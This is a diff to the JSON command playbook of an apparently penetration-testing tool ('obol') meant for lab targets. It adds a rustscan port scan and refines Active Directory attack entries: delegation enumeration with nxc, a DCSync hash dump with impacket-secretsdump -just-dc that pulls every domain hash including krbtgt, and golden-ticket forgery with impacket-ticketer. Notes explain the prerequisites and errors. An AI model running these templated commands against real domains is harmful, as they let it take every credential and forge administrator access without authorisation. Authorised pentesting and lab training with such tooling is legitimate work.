@@ -40,6 +40,11 @@
      "note": "PREFERRED: rapid discovery across the full TCP range. Run it first on lab targets so every subsequent suggestion rests on ports that are genuinely open."
     },
     {
+     "tool": "rustscan",
+     "run": "rustscan -a {{target}} --ulimit 5000 -- -sV -oN {{scandir}}/nmap-allports.txt",
+     "note": "OPTIONAL ACCELERANT: rustscan finds the open ports fast, then (after `--`) hands them to nmap for the version scan — the output is ordinary nmap output that obol parses exactly as above, so nmap stays the source of truth. Use it when a full -p- nmap is too slow; nmap is the fallback when rustscan isn't installed."
+    },
+    {
      "tool": "nmap",
      "run": "nmap -Pn --top-ports 1000 --open -oN {{scandir}}/nmap-top1000.txt {{target}}",
      "note": "Less noisy and usually adequate for an initial pass, though it will overlook anything listening beyond the well-known ports."
@@ -938,8 +943,8 @@
     },
     {
      "tool": "nxc",
-     "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' --trusted-for-delegation",
-     "note": "Accounts trusted for delegation — a delegation edge to a DA-logged host or a service you control is a path (see unconstrained-delegation / getst-impersonation). --trusted-to-auth is NOT a netexec flag; for the full constrained/RBCD (T2A4D) picture run impacket-findDelegation -dc-ip {{target}} '{{domain}}/{{user}}:{{password}}'."
+     "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' --trusted-for-delegation --find-delegation",
+     "note": "Accounts trusted for delegation — a delegation edge to a DA-logged host or a service you control is a path (see unconstrained-delegation / getst-impersonation). --find-delegation adds the full constrained/RBCD table in one pass. --trusted-to-auth is NOT a netexec flag; for the full constrained/RBCD (T2A4D) picture run impacket-findDelegation -dc-ip {{target}} '{{domain}}/{{user}}:{{password}}'."
     },
     {
      "tool": "nxc",
@@ -1084,8 +1089,8 @@
    "commands": [
     {
      "tool": "impacket-secretsdump",
-     "run": "impacket-secretsdump '{{domain}}/{{user}}:{{password}}'@{{target}}",
-     "note": "PREFERRED cash-in: a full DRSUAPI sync — every hash in the domain, krbtgt among them (golden ticket material). No interactive prompt, no DC-side artifact. Guard this file; it is the report evidence itself. PREREQUISITE if you got here via ACL abuse (not a Domain Admin): your account must ALREADY hold the two replication ACEs. Run the ACL move's `add dcsync <you>` card FIRST and re-authenticate, then this. Getting rpc_s_access_denied or DRSR code 0x20f7 (ERROR_DS_DRA_BAD_DN) means those rights are not on your account yet — joining a WriteDACL group (e.g. Exchange Windows Permissions) only lets you GRANT them; it is not the grant itself."
+     "run": "impacket-secretsdump '{{domain}}/{{user}}:{{password}}'@{{target}} -just-dc",
+     "note": "PREFERRED cash-in: a full DRSUAPI sync — every hash in the domain, krbtgt among them (golden ticket material). -just-dc forces the replication path (no local SAM/LSA read first). No interactive prompt, no DC-side artifact. Guard this file; it is the report evidence itself. PREREQUISITE if you got here via ACL abuse (not a Domain Admin): your account must ALREADY hold the two replication ACEs. Run the ACL move's `add dcsync <you>` card FIRST and re-authenticate, then this. Getting rpc_s_access_denied or DRSR code 0x20f7 (ERROR_DS_DRA_BAD_DN) means those rights are not on your account yet — joining a WriteDACL group (e.g. Exchange Windows Permissions) only lets you GRANT them; it is not the grant itself."
     },
     {
      "tool": "impacket-secretsdump",
@@ -1491,8 +1496,8 @@
    "commands": [
     {
      "tool": "impacket-ticketer",
-     "run": "impacket-ticketer -nthash {{nthash}} -domain-sid {{domain_sid}} -domain {{domain}} administrator",
-     "note": "Forge a TGT. Obtain the domain SID with lookupsid or BloodHound. Export the ccache, then supply -k flags to impacket tools."
+     "run": "impacket-ticketer -nthash {{krbtgt_hash}} -domain-sid {{domain_sid}} -domain {{domain}} administrator",
+     "note": "Forge a TGT. -nthash MUST be the krbtgt account's NT hash (from the DCSync/NTDS dump), not your own — obol fills it from the hash.krbtgt fact; if it is still {{krbtgt_hash}}, DCSync first. Obtain the domain SID with lookupsid or BloodHound. Export the ccache, then supply -k flags to impacket tools."
     }
    ]
   },
@@ -1651,7 +1656,8 @@
    ],
    "produces": [
     "credential.candidate",
-    "ad.attack_paths"
+    "ad.attack_paths",
+    "sccm.enumerated"
    ],
    "priority": 84,
    "proves": "surfaces candidate credentials and attack paths",
